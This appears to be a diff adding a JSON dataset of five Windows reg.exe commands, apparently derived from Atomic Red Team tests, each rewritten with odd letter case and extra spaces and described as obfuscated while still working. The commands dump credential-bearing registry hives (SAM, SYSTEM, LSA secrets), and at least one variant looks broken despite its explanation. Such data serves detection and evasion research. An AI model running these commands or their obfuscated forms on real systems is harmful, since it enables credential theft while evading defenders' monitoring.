@@ -1,0 +1,24 @@
+```json
+[
+  {
+    "output": "\"C:\\\\WINDOWS\\\\system32\\\\reg.exe\"  eXport  HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Session\\ Manager  C:\\\\AtomicRedTeam\\\\atomics\\\\T1547.001\\\\src\\\\SessionManagerBackup.reg /Y",
+    "explanation": "Used substitution (eXport instead of export) and insertion (extra spaces) to obfuscate the command while preserving functionality."
+  },
+  {
+    "output": "\"reg\"   sAve   HKLM\\\\security\\\\policy\\\\secrets  C:\\\\Users\\\\thaim\\\\AppData\\\\Local\\\\Temp\\\\secrets   /y",
+    "explanation": "Used substitution (sAve instead of save) and insertion (extra spaces) to obfuscate the command while preserving functionality."
+  },
+  {
+    "output": "reg   eXPoRt   HKLM\\\\SAM   C:\\\\Users\\\\thaim\\\\AppData\\\\Local\\\\Temp\\\\sam",
+    "explanation": "Used substitution (eXPoRt instead of export) and insertion (extra spaces) to obfuscate the command while preserving functionality."
+  },
+  {
+    "output": "reg   sAVe   HKLM\\\\SYSTEM   C:\\\\Windows\\\\Temp\\\\SYSTEM_HIVE",
+    "explanation": "Used substitution (sAVe instead of save) and insertion (extra spaces) to obfuscate the command while preserving functionality."
+  },
+  {
+    "output": "\"C:\\\\WINDOWS\\\\system32\\\\reg.exe\"  /export  \"HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Lsa\\\"  C:\\\\AtomicRedTeam\\\\atomics\\\\T1556.002\\\\lsa_backup.reg",
+    "explanation": "Used substitution (/export instead of export) and insertion (extra spaces) to obfuscate the command while preserving functionality."
+  }
+]
+```
